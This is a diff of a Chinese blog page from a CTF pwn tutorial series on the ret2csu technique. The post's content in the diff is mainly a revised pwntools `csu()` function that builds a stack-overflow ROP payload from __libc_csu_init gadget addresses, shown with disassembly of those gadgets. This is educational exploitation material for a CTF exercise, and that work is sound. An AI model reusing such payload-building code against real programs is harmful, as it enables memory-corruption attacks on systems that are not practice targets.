@@ -1,4 +1,4 @@
-<!doctype html><html lang=zh-CN data-theme=light><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=theme-color content="#222" media="(prefers-color-scheme: light)"><meta name=generator content="Hugo 0.146.0"><link rel="shortcut icon" type=image/x-icon href=/imgs/icons/favicon.ico><link rel=icon type=image/x-icon href=/imgs/icons/favicon.ico><link rel=icon type=image/png sizes=16x16 href=/imgs/icons/favicon_16x16_next.png><link rel=icon type=image/png sizes=32x32 href=/imgs/icons/favicon_32_32_next.png><link rel=apple-touch-icon sizes=180x180 href=/imgs/icons/apple_touch_icon_next.png><meta itemprop=name content="从零开始的 Pwn 之旅   Ret2csu"><meta itemprop=description content="不想写博客..."><meta name=description content="不想写博客..."><meta itemprop=datePublished zgotmplz><meta itemprop=dateModified zgotmplz><meta itemprop=image content="/imgs/avatar.jpg"><meta itemprop=keywords content="Ctf,Pwn"><meta property="og:type" content="article"><meta property="og:title" content="从零开始的 Pwn 之旅   Ret2csu"><meta property="og:description" content="不想写博客..."><meta property="og:image" content="/imgs/avatar.jpg"><meta property="og:image:width" content="312"><meta property="og:image:height" content="312"><meta property="og:image:type" content="image/jpeg/png/svg/jpg"><meta property="og:url" content="/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ret2csu/"><meta property="og:site_name" content="lhon901's blog"><meta property="og:locale" content="zh-CN"><meta property="article:author" content="lhon901"><meta property="article:published_time" content="2025-07-12 10:51:54 +0800 +0800"><meta property="article:modified_time" content="2025-07-12 19:05:47 +0800 +0800"><link type=text/css rel=stylesheet href=/js/3rd/font-awesome/6.7.2/css/all.min.css><link type=text/css rel=stylesheet href=/js/3rd/animate.css/3.1.1/animate.min.css><link type=text/css rel=stylesheet href=/js/3rd/viewerjs/1.11.6/viewer.min.css><link rel=stylesheet href="/css/main.min.css?=1752318396"><style type=text/css>.post-footer hr:after{content:"~ 我可是有底线的哟 ~"}.flinks-list-footer hr:after{content:"~ 我可是有底线的哟 ~"}</style><script type=text/javascript>(function(){localDB={set:function(e,t,n){if(n===0)return;const s=new Date,o=n*864e5,i={value:t,expiry:s.getTime()+o};localStorage.setItem(e,JSON.stringify(i))},get:function(e){const t=localStorage.getItem(e);if(!t)return void 0;const n=JSON.parse(t),s=new Date;return s.getTime()>n.expiry?(localStorage.removeItem(e),void 0):n.value}},theme={active:function(){const e=localDB.get("theme");if(e==null)return;theme.toggle(e),window.matchMedia("(prefers-color-scheme: dark)").addListener(function(e){theme.toggle(e.matches?"dark":"light")})},toggle:function(e){document.documentElement.setAttribute("data-theme",e),localDB.set("theme",e,2);const t=document.querySelector("iframe.giscus-frame");if(t){const n={setConfig:{theme:e}};t.contentWindow.postMessage({giscus:n},"https://giscus.app")}}},theme.active()})(window)</script><script type=text/javascript>document.addEventListener("DOMContentLoaded",()=>{var e=document.createElement("script");e.charset="UTF-8",e.src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js",e.async=!1,e.defer=!0,document.head.appendChild(e),e.onload=function(){NexT.utils.fmtBusuanzi()}})</script><title>从零开始的 Pwn 之旅 Ret2csu - lhon901's blog</title><noscript><link rel=stylesheet href=/css/noscript.css></noscript></head><body itemscope itemtype=http://schema.org/WebPage class=use-motion><div class=headband></div><main class=main><header class=header itemscope itemtype=http://schema.org/WPHeader><div class=header-inner><div class=site-brand-container><div class=site-nav-toggle><div class=toggle aria-label role=button><span class=toggle-line></span>
+<!doctype html><html lang=zh-CN data-theme=light><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=theme-color content="#222" media="(prefers-color-scheme: light)"><meta name=generator content="Hugo 0.146.0"><link rel="shortcut icon" type=image/x-icon href=/imgs/icons/favicon.ico><link rel=icon type=image/x-icon href=/imgs/icons/favicon.ico><link rel=icon type=image/png sizes=16x16 href=/imgs/icons/favicon_16x16_next.png><link rel=icon type=image/png sizes=32x32 href=/imgs/icons/favicon_32_32_next.png><link rel=apple-touch-icon sizes=180x180 href=/imgs/icons/apple_touch_icon_next.png><meta itemprop=name content="从零开始的 Pwn 之旅 - Ret2csu"><meta itemprop=description content="不想写博客..."><meta name=description content="不想写博客..."><meta itemprop=datePublished zgotmplz><meta itemprop=dateModified zgotmplz><meta itemprop=image content="/imgs/avatar.jpg"><meta itemprop=keywords content="Ctf,Pwn"><meta property="og:type" content="article"><meta property="og:title" content="从零开始的 Pwn 之旅 - Ret2csu"><meta property="og:description" content="不想写博客..."><meta property="og:image" content="/imgs/avatar.jpg"><meta property="og:image:width" content="312"><meta property="og:image:height" content="312"><meta property="og:image:type" content="image/jpeg/png/svg/jpg"><meta property="og:url" content="/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ret2csu/"><meta property="og:site_name" content="lhon901's blog"><meta property="og:locale" content="zh-CN"><meta property="article:author" content="lhon901"><meta property="article:published_time" content="2025-07-12 10:51:54 +0800 +0800"><meta property="article:modified_time" content="2025-07-12 19:38:53 +0800 +0800"><link type=text/css rel=stylesheet href=/js/3rd/font-awesome/6.7.2/css/all.min.css><link type=text/css rel=stylesheet href=/js/3rd/animate.css/3.1.1/animate.min.css><link type=text/css rel=stylesheet href=/js/3rd/viewerjs/1.11.6/viewer.min.css><link rel=stylesheet href="/css/main.min.css?=1752320385"><style type=text/css>.post-footer hr:after{content:"~ 我可是有底线的哟 ~"}.flinks-list-footer hr:after{content:"~ 我可是有底线的哟 ~"}</style><script type=text/javascript>(function(){localDB={set:function(e,t,n){if(n===0)return;const s=new Date,o=n*864e5,i={value:t,expiry:s.getTime()+o};localStorage.setItem(e,JSON.stringify(i))},get:function(e){const t=localStorage.getItem(e);if(!t)return void 0;const n=JSON.parse(t),s=new Date;return s.getTime()>n.expiry?(localStorage.removeItem(e),void 0):n.value}},theme={active:function(){const e=localDB.get("theme");if(e==null)return;theme.toggle(e),window.matchMedia("(prefers-color-scheme: dark)").addListener(function(e){theme.toggle(e.matches?"dark":"light")})},toggle:function(e){document.documentElement.setAttribute("data-theme",e),localDB.set("theme",e,2);const t=document.querySelector("iframe.giscus-frame");if(t){const n={setConfig:{theme:e}};t.contentWindow.postMessage({giscus:n},"https://giscus.app")}}},theme.active()})(window)</script><script type=text/javascript>document.addEventListener("DOMContentLoaded",()=>{var e=document.createElement("script");e.charset="UTF-8",e.src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js",e.async=!1,e.defer=!0,document.head.appendChild(e),e.onload=function(){NexT.utils.fmtBusuanzi()}})</script><title>从零开始的 Pwn 之旅 - Ret2csu - lhon901's blog</title><noscript><link rel=stylesheet href=/css/noscript.css></noscript></head><body itemscope itemtype=http://schema.org/WebPage class=use-motion><div class=headband></div><main class=main><header class=header itemscope itemtype=http://schema.org/WPHeader><div class=header-inner><div class=site-brand-container><div class=site-nav-toggle><div class=toggle aria-label role=button><span class=toggle-line></span>
 <span class=toggle-line></span>
 <span class=toggle-line></span></div></div><div class=site-meta><a href=/ class=brand rel=start><i class=logo-line></i><h1 class=site-title>lhon901's blog</h1><i class=logo-line></i></a><p class=site-subtitle itemprop=description></p></div><div class=site-nav-right><div class="toggle popup-trigger"><i class="fa fa-search fa-fw fa-lg"></i></div></div></div><nav class=site-nav><ul class="main-menu menu"><li class="menu-item menu-item-home"><a href=/ class=hvr-icon-pulse rel=section><i class="fa fa-home hvr-icon"></i>首页</a></li><li class="menu-item menu-item-about"><a href=/ class=hvr-icon-pulse rel=section><i class="fa fa-user hvr-icon"></i>关于</a></li><li class="menu-item menu-item-flinks"><a href=/ class=hvr-icon-pulse rel=section><i class="fa fa-thumbs-up hvr-icon"></i>友情链接</a></li><li class="menu-item menu-item-example"><a href=/ class="menus-parent hvr-icon-pulse" rel=section><i class="fa fa-angles-down hvr-icon"></i>语法示例
 <span class=menu-item-shrink-icon><i class="fa fa-angle-right"></i></span></a><ul class=menu-children><li class=menu-child-item><a href=/ class=hvr-icon-pulse rel=section><i class="fa hvr-icon"></i>语法高亮</a></li><li class=menu-child-item><a href=/ class=hvr-icon-pulse rel=section><i class="fa hvr-icon"></i>数学公式</a></li><li class=menu-child-item><a href=/post/11-mermaid-charts class=hvr-icon-pulse rel=section><i class="fa hvr-icon"></i>流程图</a></li></ul></li><li class="menu-item menu-item-archives"><a href=/ class=hvr-icon-pulse rel=section><i class="fa fa-archive hvr-icon"></i>归档
@@ -12,9 +12,9 @@ Github
 </a></span><span class=links-of-social-item><a href=mailto:lhon901@163.com title="E-Mail → mailto:lhon901@163.com" rel=noopener class=hvr-icon-pulse target=_blank><i class="fa fa-envelope fa-fw hvr-icon"></i>
 E-Mail</a></span></div><div class="cc-license animated" itemprop=license><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans class=cc-opacity rel=noopener target=_blank title=共享知识><img src=/imgs/img-lazy-loading.gif data-src=/imgs/cc/big/by_nc_sa.svg alt=共享知识></a></div><div class="links-of-blogroll site-overview-item animated"><div class=links-of-blogroll-title><i class="fa fa-globe fa-fw"></i>
 友情链接</div><ul class=links-of-blogroll-list><li class=links-of-blogroll-item><a href=https://gitee.com/hugo-next/hugo-theme-next title=https://gitee.com/hugo-next/hugo-theme-next target=_blank>Hugo-NexT</a></li><li class=links-of-blogroll-item><a href=https://lisenhui.cn title=https://lisenhui.cn target=_blank>凡梦星尘空间站</a></li></ul></div></div></div></div><div id=siteinfo-card-widget class=sidebar-card-widget><div class=item-headline><i class="fas fa-chart-line"></i>
-<span>网站资讯</span></div><div class=siteinfo><div class=siteinfo-item><div class=item-name><i class="fa-solid fa-calendar-check"></i>已运行：</div><div class=item-count id=runTimes data-publishdate="2025-04-14 20:18:58 +0800 +0800"></div></div><div class=siteinfo-item><div class=item-name><i class="fas fa fa-user"></i>总访客数：</div><div class=item-count id=busuanzi_value_site_uv><i class="fa fa-sync fa-spin"></i></div></div><div class=siteinfo-item><div class=item-name><i class="fas fa fa-eye"></i>页面浏览：</div><div class=item-count id=busuanzi_value_site_pv><i class="fa fa-sync fa-spin"></i></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-font"></i>总字数：</div><div class=item-count id=wordsCount data-count=41759></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-mug-hot"></i>阅读约：</div><div class=item-count id=readTimes data-times=90></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-clock-rotate-left"></i>最后更新于：</div><div class=item-count id=last-push-date data-lastpushdate="2025-07-12 19:05:47 +0800 +0800"></div></div></div></div></aside><div class=sidebar-dimmer></div></header><div class=tool-buttons><div id=goto-i18n-translate class=button title=多语言翻译><i class="fas fa-globe"></i></div><div id=toggle-theme class=button title=深浅模式切换><i class="fas fa-adjust"></i></div><div class=back-to-top role=button title=返回顶部><i class="fa fa-arrow-up"></i>
+<span>网站资讯</span></div><div class=siteinfo><div class=siteinfo-item><div class=item-name><i class="fa-solid fa-calendar-check"></i>已运行：</div><div class=item-count id=runTimes data-publishdate="2025-04-14 20:18:58 +0800 +0800"></div></div><div class=siteinfo-item><div class=item-name><i class="fas fa fa-user"></i>总访客数：</div><div class=item-count id=busuanzi_value_site_uv><i class="fa fa-sync fa-spin"></i></div></div><div class=siteinfo-item><div class=item-name><i class="fas fa fa-eye"></i>页面浏览：</div><div class=item-count id=busuanzi_value_site_pv><i class="fa fa-sync fa-spin"></i></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-font"></i>总字数：</div><div class=item-count id=wordsCount data-count=42079></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-mug-hot"></i>阅读约：</div><div class=item-count id=readTimes data-times=91></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-clock-rotate-left"></i>最后更新于：</div><div class=item-count id=last-push-date data-lastpushdate="2025-07-12 19:38:53 +0800 +0800"></div></div></div></div></aside><div class=sidebar-dimmer></div></header><div class=tool-buttons><div id=goto-i18n-translate class=button title=多语言翻译><i class="fas fa-globe"></i></div><div id=toggle-theme class=button title=深浅模式切换><i class="fas fa-adjust"></i></div><div class=back-to-top role=button title=返回顶部><i class="fa fa-arrow-up"></i>
 <span>0%</span></div></div><div class=reading-progress-bar></div><a role=button class="book-mark-link book-mark-link-fixed"></a><a href=https://github.com/hugo-next rel="noopener external nofollow noreferrer" target=_blank title="Follow me on GitHub" class="exturl github-corner"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0 0 115 115h15l12 27L250 250V0z"/><path d="M128.3 109C113.8 99.7 119 89.6 119 89.6 122 82.7 120.5 78.6 120.5 78.6 119.2 72 123.4 76.3 123.4 76.3 127.3 80.9 125.5 87.3 125.5 87.3 122.9 97.6 130.6 101.9 134.4 103.2" fill="currentcolor" style="transform-origin:130px 106px" class="octo-arm"/><path d="M115 115C114.9 115.1 118.7 116.5 119.8 115.4l13.9-13.8C136.9 99.2 139.9 98.4 142.2 98.6 133.8 88 127.5 74.4 143.8 58 148.5 53.4 154 51.2 159.7 51 160.3 49.4 163.2 43.6 171.4 40.1 171.4 40.1 176.1 42.5 178.8 56.2 183.1 58.6 187.2 61.8 190.9 65.4 194.5 69 197.7 73.2 200.1 77.6 213.8 80.2 216.3 84.9 216.3 84.9 212.7 93.1 206.9 96 205.4 96.6 205.1 102.4 203 107.8 198.3 112.5 181.9 128.9 168.3 122.5 157.7 114.1 157.9 116.9 156.7 120.9 152.7 124.9L141 136.5C139.8 137.7 141.6 141.9 141.8 141.8z" fill="currentcolor" class="octo-body"/></svg>
-</a><script type=text/javascript src=//sidecar.gitter.im/dist/sidecar.v1.js async></script><script type=text/javascript>((window.gitter={}).chat={}).options={room:"hugo-next/community"}</script><noscript><div class=noscript-warning>Theme NexT works best with JavaScript enabled</div></noscript><div class="main-inner post posts-expand"><div class=post-block><article itemscope itemtype=http://schema.org/Article class=post-content lang><link itemprop=mainEntityOfPage href=/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ret2csu/><span hidden itemprop=author itemscope itemtype=http://schema.org/Person><meta itemprop=image content="/imgs/avatar.jpg"><meta itemprop=name content="lhon901"></span><span hidden itemprop=publisher itemscope itemtype=http://schema.org/Organization><meta itemprop=name content="lhon901"><meta itemprop=description content="不想写博客..."></span><span hidden itemprop=post itemscope itemtype=http://schema.org/CreativeWork><meta itemprop=name content="从零开始的 Pwn 之旅   Ret2csu"><meta itemprop=description content="前言
+</a><script type=text/javascript src=//sidecar.gitter.im/dist/sidecar.v1.js async></script><script type=text/javascript>((window.gitter={}).chat={}).options={room:"hugo-next/community"}</script><noscript><div class=noscript-warning>Theme NexT works best with JavaScript enabled</div></noscript><div class="main-inner post posts-expand"><div class=post-block><article itemscope itemtype=http://schema.org/Article class=post-content lang><link itemprop=mainEntityOfPage href=/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ret2csu/><span hidden itemprop=author itemscope itemtype=http://schema.org/Person><meta itemprop=image content="/imgs/avatar.jpg"><meta itemprop=name content="lhon901"></span><span hidden itemprop=publisher itemscope itemtype=http://schema.org/Organization><meta itemprop=name content="lhon901"><meta itemprop=description content="不想写博客..."></span><span hidden itemprop=post itemscope itemtype=http://schema.org/CreativeWork><meta itemprop=name content="从零开始的 Pwn 之旅 - Ret2csu"><meta itemprop=description content="前言
 
 正常程序中是不可能有许多可利用的 gadget的，通常只有一个或几个 gadget 可以利用
 ret2csu 是一个常见的 gadget，通常在使用 C++ 的程序中会有这个 gadget
@@ -26,21 +26,21 @@ ret2csu 是一个常见的 gadget，通常在使用 C++ 的程序中会有这个
     
     
     
-"></span><header class=post-header><h1 class=post-title itemprop="name headline">从零开始的 Pwn 之旅 Ret2csu
+"></span><header class=post-header><h1 class=post-title itemprop="name headline">从零开始的 Pwn 之旅 - Ret2csu
 <a href=https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name/posts/%e4%bb%8e%e9%9b%b6%e5%bc%80%e5%a7%8b%e7%9a%84%20Pwn%20%e4%b9%8b%e6%97%85%20-%20ret2csu.md rel="noopener external nofollow noreferrer" target=_blank class="exturl post-edit-link" title=编辑><i class="fa fa-pen-nib"></i></a></h1><div class=post-meta-container><div class=post-meta-items><span class=post-meta-item><span class=post-meta-item-icon><i class="fas fa-solid fa-calendar"></i>
 </span><span class=post-meta-item-text title=发表于>发表于：
 </span><time title="创建时间：2025-07-12 10:51:54 +08:00" itemprop="dateCreated datePublished" datetime="2025-07-12 10:51:54 +0800 +0800">2025-07-12
 </time></span><span class=post-meta-item><span class=post-meta-item-icon><i class="fas fa-solid fa-calendar-check"></i>
 </span><span class=post-meta-item-text title=更新于>更新于：
-</span><time title="修改时间：2025-07-12 19:05:47 +08:00" itemprop="dateModified dateLastmod" datetime="2025-07-12 19:05:47 +0800 +0800">2025-07-12
+</span><time title="修改时间：2025-07-12 19:38:53 +08:00" itemprop="dateModified dateLastmod" datetime="2025-07-12 19:38:53 +0800 +0800">2025-07-12
 </time></span><span class=post-meta-item><span class=post-meta-item-icon><i class="fas fa-solid fa-folder-open"></i>
 </span><span class=post-meta-item-text title=分类于>分类于：
 </span><span itemprop=about itemscope itemtype=http://schema.org/Thing><a href=/categories/ctf/ itemprop=url rel=index><span itemprop=name>Ctf</span></a></span></span></div><div class=post-meta-items><span class=post-meta-item title=字数><span class=post-meta-item-icon><i class="fas fa-solid fa-file-word"></i>
 </span><span class=post-meta-item-text>字数：</span>
-<span>1361</span>
+<span>1681</span>
 </span><span class=post-meta-item title=阅读><span class=post-meta-item-icon><i class="fas fa-solid fa-clock"></i>
 </span><span class=post-meta-item-text>阅读：&ap;</span>
-<span>3分钟</span>
+<span>4分钟</span>
 </span><span class=post-meta-item title=浏览><span class=post-meta-item-icon><i class="fas fa-solid fa-eye"></i>
 </span><span class=post-meta-item-text>浏览：
 </span><span id=busuanzi_value_page_pv data-path=/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ret2csu/><i class="fa fa-sync fa-spin"></i></span></span></div></div></header><div class="post-body autonumber" itemprop=articleBody><h2 id=前言>前言
@@ -224,7 +224,25 @@ ret2csu 是一个常见的 gadget，通常在使用 C++ 的程序中会有这个
 </span><span class=lnt id=hl-4-14><a class=lnlinks href=#hl-4-14>14</a>
 </span><span class=lnt id=hl-4-15><a class=lnlinks href=#hl-4-15>15</a>
 </span><span class=lnt id=hl-4-16><a class=lnlinks href=#hl-4-16>16</a>
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>csu</span><span class=p>(</span><span class=n>rbx</span><span class=p>,</span> <span class=n>rbp</span><span class=p>,</span> <span class=n>r12</span><span class=p>,</span> <span class=n>r13</span><span class=p>,</span> <span class=n>r14</span><span class=p>,</span> <span class=n>r15</span><span class=p>,</span> <span class=n>last</span><span class=p>):</span>
+</span><span class=lnt id=hl-4-17><a class=lnlinks href=#hl-4-17>17</a>
+</span><span class=lnt id=hl-4-18><a class=lnlinks href=#hl-4-18>18</a>
+</span><span class=lnt id=hl-4-19><a class=lnlinks href=#hl-4-19>19</a>
+</span><span class=lnt id=hl-4-20><a class=lnlinks href=#hl-4-20>20</a>
+</span><span class=lnt id=hl-4-21><a class=lnlinks href=#hl-4-21>21</a>
+</span><span class=lnt id=hl-4-22><a class=lnlinks href=#hl-4-22>22</a>
+</span><span class=lnt id=hl-4-23><a class=lnlinks href=#hl-4-23>23</a>
+</span><span class=lnt id=hl-4-24><a class=lnlinks href=#hl-4-24>24</a>
+</span><span class=lnt id=hl-4-25><a class=lnlinks href=#hl-4-25>25</a>
+</span><span class=lnt id=hl-4-26><a class=lnlinks href=#hl-4-26>26</a>
+</span><span class=lnt id=hl-4-27><a class=lnlinks href=#hl-4-27>27</a>
+</span><span class=lnt id=hl-4-28><a class=lnlinks href=#hl-4-28>28</a>
+</span><span class=lnt id=hl-4-29><a class=lnlinks href=#hl-4-29>29</a>
+</span><span class=lnt id=hl-4-30><a class=lnlinks href=#hl-4-30>30</a>
+</span><span class=lnt id=hl-4-31><a class=lnlinks href=#hl-4-31>31</a>
+</span><span class=lnt id=hl-4-32><a class=lnlinks href=#hl-4-32>32</a>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>count</span> <span class=o>=</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>csu</span><span class=p>(</span><span class=n>rbx</span><span class=p>,</span> <span class=n>rbp</span><span class=p>,</span> <span class=n>r12</span><span class=p>,</span> <span class=n>r13</span><span class=p>,</span> <span class=n>r14</span><span class=p>,</span> <span class=n>r15</span><span class=p>,</span> <span class=n>last</span><span class=p>):</span>
 </span></span><span class=line><span class=cl>    <span class=c1># pop rbx,rbp,r12,r13,r14,r15</span>
 </span></span><span class=line><span class=cl>    <span class=c1># rbx should be 0,</span>
 </span></span><span class=line><span class=cl>    <span class=c1># rbp should be 1,enable not to jump</span>
@@ -232,33 +250,93 @@ ret2csu 是一个常见的 gadget，通常在使用 C++ 的程序中会有这个
 </span></span><span class=line><span class=cl>    <span class=c1># rdi=edi=r13d</span>
 </span></span><span class=line><span class=cl>    <span class=c1># rsi=r14</span>
 </span></span><span class=line><span class=cl>    <span class=c1># rdx=r15</span>
-</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=mh>0x80</span> <span class=o>+</span> <span class=n>fakeebp</span>
-</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>csu_end_addr</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>rbx</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>rbp</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r12</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span>
-</span></span><span class=line><span class=cl>        <span class=n>r13</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r14</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r15</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>count</span>
+</span></span><span class=line><span class=cl>    <span class=n>count</span> <span class=o>+=</span> <span class=mi>1</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;a&#34;</span> <span class=o>*</span> <span class=p>(</span><span class=mi>136</span> <span class=o>-</span> <span class=mi>8</span><span class=p>)</span> <span class=o>+</span> <span class=n>fakeebp</span>
+</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>+=</span> <span class=p>(</span>
+</span></span><span class=line><span class=cl>        <span class=n>p64</span><span class=p>(</span><span class=n>csu_end_addr</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>rbx</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>rbp</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r12</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r13</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r14</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r15</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=p>)</span>
 </span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>csu_front_addr</span><span class=p>)</span>
-</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>+=</span> <span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=mh>0x38</span>
+</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;a&#34;</span> <span class=o>*</span> <span class=mh>0x38</span>
 </span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>last</span><span class=p>)</span>
-</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
-</span></span><span class=line><span class=cl>    <span class=n>sleep</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><h2 id=攻克题目>攻克题目
-<a class=header-anchor href=#%e6%94%bb%e5%85%8b%e9%a2%98%e7%9b%ae></a></h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-5-1><a class=lnlinks href=#hl-5-1>1</a>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>count</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>gdb</span><span class=o>.</span><span class=n>attach</span><span class=p>(</span><span class=n>io</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>pause</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>sleep</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><p>csu_front_addr 地址为</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-5-1><a class=lnlinks href=#hl-5-1>1</a>
 </span><span class=lnt id=hl-5-2><a class=lnlinks href=#hl-5-2>2</a>
-</span><span class=lnt id=hl-5-3><a class=lnlinks href=#hl-5-3>3</a>
-</span><span class=lnt id=hl-5-4><a class=lnlinks href=#hl-5-4>4</a>
-</span><span class=lnt id=hl-5-5><a class=lnlinks href=#hl-5-5>5</a>
-</span><span class=lnt id=hl-5-6><a class=lnlinks href=#hl-5-6>6</a>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>.text:00000000004005F0 loc_4005F0:                             ; CODE XREF: __libc_csu_init+64↓j
+</span></span><span class=line><span class=cl>.text:00000000004005F0                 mov     rdx, r15</span></span></code></pre></td></tr></table></div></div><p>csu_end_addr 地址为</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-6-1><a class=lnlinks href=#hl-6-1>1</a>
+</span><span class=lnt id=hl-6-2><a class=lnlinks href=#hl-6-2>2</a>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>.text:0000000000400606 loc_400606:                             ; CODE XREF: __libc_csu_init+48↑j
+</span></span><span class=line><span class=cl>.text:0000000000400606                 mov     rbx, [rsp+38h+var_30]</span></span></code></pre></td></tr></table></div></div><div class=post-alert-note><div class=post-alert-title><i class="fa-solid fa-bell"></i>
+<span>为什么要使用这种形式的 payload?</span></div><div class=post-alert-content></div></div><p><a href=https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/medium-rop/ title=ctfwiki rel="noopener external nofollow noreferrer" target=_blank class=exturl>ctfwiki
+<i class="fa fa-external-link-alt"></i>
+</a>ctfwiki 中下半部分使用 pop 进行控制</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-7-1><a class=lnlinks href=#hl-7-1> 1</a>
+</span><span class=lnt id=hl-7-2><a class=lnlinks href=#hl-7-2> 2</a>
+</span><span class=lnt id=hl-7-3><a class=lnlinks href=#hl-7-3> 3</a>
+</span><span class=lnt id=hl-7-4><a class=lnlinks href=#hl-7-4> 4</a>
+</span><span class=lnt id=hl-7-5><a class=lnlinks href=#hl-7-5> 5</a>
+</span><span class=lnt id=hl-7-6><a class=lnlinks href=#hl-7-6> 6</a>
+</span><span class=lnt id=hl-7-7><a class=lnlinks href=#hl-7-7> 7</a>
+</span><span class=lnt id=hl-7-8><a class=lnlinks href=#hl-7-8> 8</a>
+</span><span class=lnt id=hl-7-9><a class=lnlinks href=#hl-7-9> 9</a>
+</span><span class=lnt id=hl-7-10><a class=lnlinks href=#hl-7-10>10</a>
+</span><span class=lnt id=hl-7-11><a class=lnlinks href=#hl-7-11>11</a>
+</span><span class=lnt id=hl-7-12><a class=lnlinks href=#hl-7-12>12</a>
+</span><span class=lnt id=hl-7-13><a class=lnlinks href=#hl-7-13>13</a>
+</span><span class=lnt id=hl-7-14><a class=lnlinks href=#hl-7-14>14</a>
+</span><span class=lnt id=hl-7-15><a class=lnlinks href=#hl-7-15>15</a>
